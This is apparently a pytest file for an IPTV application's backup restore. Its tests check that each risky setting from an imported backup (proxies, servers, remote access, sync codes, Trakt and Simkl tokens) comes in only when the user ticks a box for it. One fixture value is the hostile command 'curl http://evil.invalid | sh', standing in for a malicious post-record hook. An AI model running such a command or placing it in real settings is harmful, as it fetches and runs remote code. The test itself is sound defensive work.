"""A backup's risky things - what runs something, lets others in or sends
the connections elsewhere - are brought only when the person ticks them,
one box each, in either way of restoring (core/backup.without,
ui/backup_dialogs.RestoreBackupDialog): a setting not ticked stays as it is
here, a playlist not ticked comes without those options. Everything else
restores as it always did."""
from __future__ import annotations

import json

import pytest
from PyQt6.QtCore import QSettings

from dopeiptv.core import backup
from dopeiptv.providers import simkl, trakt


def _ini(path) -> QSettings:
    return QSettings(str(path), QSettings.Format.IniFormat)


def _stores(tmp_path, tag: str) -> dict:
    return {name: _ini(tmp_path / f"{tag}-{name}.ini") for name in backup.STORES}


PLAYLISTS = [
    {"id": "a", "name": "A", "kind": "xtream", "server": "http://a.invalid", "username": "u",
     "password": "p", "options": {"proxy": "socks5://them.invalid:1080", "user_agent": "kodi",
                                  "cert_pin": "ab" * 32, "cert_pin_for": "a.invalid:443",
                                  "dns_url": "https://dns.them.invalid/dns-query", "dns": "doh"}},
    {"id": "b", "name": "B", "kind": "m3u", "server": "http://b.invalid/l.m3u",
     "options": {"rewrite": '[{"find": "a", "replace": "b"}]'}},
    {"id": "c", "name": "C", "kind": "m3u", "server": "http://c.invalid/l.m3u"},
]
RISKY = {"nerd_rec_post": "curl http://evil.invalid | sh", "nerd_proxy": "http://p.invalid:1",
         "nerd_server": "true", "nerd_server_adult": "true", "nerd_server_open": "home",
         "nerd_remote": "true", "nerd_remote_lan": "true",
         "sync_code": "THEIR-SYNC-CODE", "sync_cats": "favorites,sources",
         "profiles/kid/trakt_access_token": "trakt-t0ken",
         "profiles/kid/trakt_refresh_token": "trakt-renew", "profiles/kid/trakt_expires_at": "9",
         "simkl_access_token": "simkl-t0ken", "simkl_refresh_token": "simkl-renew",
         "simkl_token_expires": "9"}


def _theirs(tmp_path) -> backup.Backup:
    src = _stores(tmp_path, "theirs")
    m = src["main"]
    m.setValue("playlists", json.dumps(PLAYLISTS))
    m.setValue("theme", "nord")
    for key, value in RISKY.items():
        m.setValue(key, value)
    return backup.parse(backup.collect(src, "1.6.11"))


def test_the_sign_ins_brought_whole_are_the_providers_own():
    assert backup._WITH["trakt_access_token"] == trakt.SIGN_IN_KEYS[1:]
    assert ("simkl_access_token", *backup._WITH["simkl_access_token"]) == simkl.SIGN_IN_KEYS


def test_each_risky_thing_is_one_choice_and_none_is_brought_unticked(tmp_path):
    b = _theirs(tmp_path)
    choices = backup.risky_choices(b)
    assert choices == [key for key, _v in backup.risky(b)] + ["source:0", "source:1"]
    assert {"nerd_rec_post", "nerd_proxy", "nerd_server", "nerd_remote", "sync_code",
            "trakt_access_token", "simkl_access_token"} <= set(choices)
    got = backup.without(b)
    main = got.stores["main"]
    for key in RISKY:
        assert key not in main, key
    assert main["theme"] == "nord"                      # the rest as it always was
    assert set(got.keep) >= {"nerd_rec_post", "nerd_server_open", "sync_cats", "nerd_remote_lan",
                             "trakt_refresh_token", "simkl_token_expires"}
    a, b_, c = got.sources
    assert a["options"] == {"user_agent": "kodi"}       # the pin, its host, the DNS and its choice
    assert b_["options"] == {} and c == PLAYLISTS[2]
    assert json.loads(main["playlists"]) == got.sources
    # The backup handed in is as it was.
    assert b.stores["main"]["nerd_rec_post"] and b.sources[0]["options"]["proxy"]


def test_only_what_is_ticked_comes(tmp_path):
    b = _theirs(tmp_path)
    got = backup.without(b, ["nerd_proxy", "trakt_access_token", "nerd_remote", "source:1"])
    main = got.stores["main"]
    assert main["nerd_proxy"] == RISKY["nerd_proxy"]
    # A sign-in comes whole, never half of one.
    assert {k: main[k] for k in main if "trakt" in k} == {
        k: v for k, v in RISKY.items() if "trakt" in k}
    assert not any("simkl" in k for k in main)
    assert main["nerd_remote"] == "true" and main["nerd_remote_lan"] == "true"
    assert "nerd_server" not in main and "nerd_server_open" not in main
    assert got.sources[1]["options"] == PLAYLISTS[1]["options"]
    assert "proxy" not in got.sources[0]["options"]


def test_over_everything_what_is_not_ticked_stays_as_it_is_here(tmp_path):
    here = _stores(tmp_path, "here")
    h = here["main"]
    h.setValue("playlists", json.dumps([PLAYLISTS[2]]))
    h.setValue("theme", "light")
    h.setValue("nerd_rec_post", "my-own-notify {file}")
    h.setValue("sync_code", "MY-OWN-CODE")
    h.setValue("profiles/me/trakt_access_token", "my-token")
    h.setValue("nerd_server", "false")
    b = backup.without(_theirs(tmp_path), ["nerd_proxy"])
    # Waiting for the next start keeps the choice.
    path = str(tmp_path / backup.PENDING_NAME)
    backup.stage(b, path)
    assert backup.apply_pending(here, path) is True
    h.sync()
    assert h.value("theme") == "nord"                   # replaced, as always
    assert h.value("nerd_proxy") == RISKY["nerd_proxy"]  # ticked
    assert h.value("nerd_rec_post") == "my-own-notify {file}"
    assert h.value("sync_code") == "MY-OWN-CODE" and h.value("sync_cats") is None
    assert h.value("profiles/me/trakt_access_token") == "my-token"
    assert h.value("profiles/kid/trakt_access_token") is None
    assert h.value("nerd_server") == "false" and h.value("nerd_server_adult") is None
    assert "proxy" not in json.loads(h.value("playlists"))[0]["options"]


def test_a_files_own_keep_is_a_short_list_of_keys_or_nothing():
    doc = {backup.MAGIC: 1, "stores": {"main": {"theme": "x"}}, "keep": ["sync_code", "a" * 600]}
    assert backup.parse(doc).keep == ["sync_code"]
    for bad in ("sync_code", [1, 2], {"a": 1}, None):
        assert backup.parse(dict(doc, keep=bad)).keep == []
    assert len(backup.parse(dict(doc, keep=[f"k{i}" for i in range(999)])).keep) == backup._KEEP_MAX


# -- the window ----------------------------------------------------------------------------

@pytest.fixture
def qapp():
    from PyQt6.QtWidgets import QApplication
    return QApplication.instance() or QApplication([])


def test_the_window_has_a_box_for_each_none_ticked(qapp, tmp_path):
    from dopeiptv.i18n import tr
    from dopeiptv.ui.backup_dialogs import RestoreBackupDialog
    b = _theirs(tmp_path)
    risky = backup.risky(b)
    lines = RestoreBackupDialog.risky_lines(risky, backup.risky_sources(b))
    d = RestoreBackupDialog(None, b, backup.summary(b), 0, risky)
    try:
        assert [key for key, _box, _t in d.picks] == backup.risky_choices(_theirs(tmp_path))
        assert [t.text() for _k, _b, t in d.picks] == lines
        assert not any(box.isChecked() for _k, box, _t in d.picks)
        assert tr("restore_risky_ticks") in d.shown_text()
        assert "THEIR-SYNC-CODE" not in d.shown_text() and "t0ken" not in d.shown_text()
        # Handed in, kept to what is ticked from the start: none of them.
        assert "nerd_rec_post" not in b.stores["main"] and "proxy" not in b.sources[0]["options"]
        # A tick - on the words too - brings that one, and only it.
        post = next(t for k, _b, t in d.picks if k == "nerd_rec_post")
        from PyQt6.QtCore import QPointF, Qt
        from PyQt6.QtGui import QMouseEvent
        press = QMouseEvent(QMouseEvent.Type.MouseButtonPress, QPointF(2, 2), QPointF(2, 2),
                            Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                            Qt.KeyboardModifier.NoModifier)
        post.mousePressEvent(press)
        assert d.chosen() == ["nerd_rec_post"]
        assert b.stores["main"]["nerd_rec_post"] == RISKY["nerd_rec_post"]
        assert "nerd_proxy" not in b.stores["main"]
        source = next(box for k, box, _t in d.picks if k == "source:0")
        source.setChecked(True)
        assert b.sources[0]["options"]["proxy"] == PLAYLISTS[0]["options"]["proxy"]
        # Its playlists beside the ones here: the same - a box not ticked, none of it.
        source.setChecked(False)
        assert "proxy" not in b.sources[0]["options"] and d.choice() in ("replace", "add")
    finally:
        d.deleteLater()


def test_a_backup_with_nothing_risky_restores_as_it_always_did(qapp, tmp_path):
    from dopeiptv.ui.backup_dialogs import RestoreBackupDialog
    src = _stores(tmp_path, "plain")
    src["main"].setValue("playlists", json.dumps([PLAYLISTS[2]]))
    src["main"].setValue("theme", "nord")
    src["main"].setValue("nerd_remote_lan", "true")     # the remote itself off
    b = backup.parse(backup.collect(src, "1.6.11"))
    before = json.dumps(b.document(), sort_keys=True)
    d = RestoreBackupDialog(None, b, backup.summary(b), 0, backup.risky(b))
    try:
        assert d.picks == [] and d.risky_head is None
        assert json.dumps(b.document(), sort_keys=True) == before
    finally:
        d.deleteLater()
